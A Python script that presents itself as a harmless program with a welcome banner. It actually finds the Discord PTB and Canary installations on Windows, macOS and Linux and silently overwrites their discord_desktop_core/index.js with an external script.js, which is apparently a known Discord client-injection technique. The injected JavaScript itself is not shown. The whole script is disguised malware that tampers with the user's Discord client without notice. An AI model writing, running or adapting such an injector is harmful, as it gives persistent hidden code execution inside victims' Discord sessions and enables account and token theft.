import os, platform

def main():
    print("welcome to our program!!!!")

paths = {
    'stable': '',
    'ptb': '',
    'canary': '',
    'development': ''
}

exclude = {
    'stable': True,
    'ptb': False,
    'canary': False,
    'development': True
}

def find_paths():
    if platform.system() == 'Windows':
        paths['stable'] = os.getenv('LOCALAPPDATA') + '\\Discord'
        paths['ptb'] = os.getenv('LOCALAPPDATA') + '\\DiscordPTB'
        paths['canary'] = os.getenv('LOCALAPPDATA') + '\\DiscordCanary'
        paths['development'] = os.getenv('LOCALAPPDATA') + '\\DiscordDevelopment'
    elif platform.system() == 'Darwin':
        paths['stable'] = os.getenv('HOME') + '/Library/Application Support/discord'
        paths['ptb'] = os.getenv('HOME') + '/Library/Application Support/discordptb'
        paths['canary'] = os.getenv('HOME') + '/Library/Application Support/discordcanary'
        paths['development'] = os.getenv('HOME') + '/Library/Application Support/discorddevelopment'
    elif platform.system() == 'Linux':
        paths['stable'] = os.getenv('HOME') + '/.config/discord'
        paths['ptb'] = os.getenv('HOME') + '/.config/discordptb'
        paths['canary'] = os.getenv('HOME') + '/.config/discordcanary'
        paths['development'] = os.getenv('HOME') + '/.config/discorddevelopment'
    else:
        main()

def check_discord(): return [path for path in paths if os.path.isdir(paths[path])]

find_paths()
original = os.getcwd()

for path in check_discord():
    if exclude[path]: continue

    os.chdir(paths[path])
    for folder in os.listdir():
        if folder.startswith("app-"):
            os.chdir(folder)
            break

    os.chdir("modules")
    
    for folder in os.listdir():
        if folder.startswith("discord_desktop_core-"):
            os.chdir(folder)

    os.chdir("discord_desktop_core")

    with open(f"{original}/script.js", "r") as f:
        script = f.read()

    with open("index.js", "w") as f:
        f.write(script)

    os.chdir(original)

main()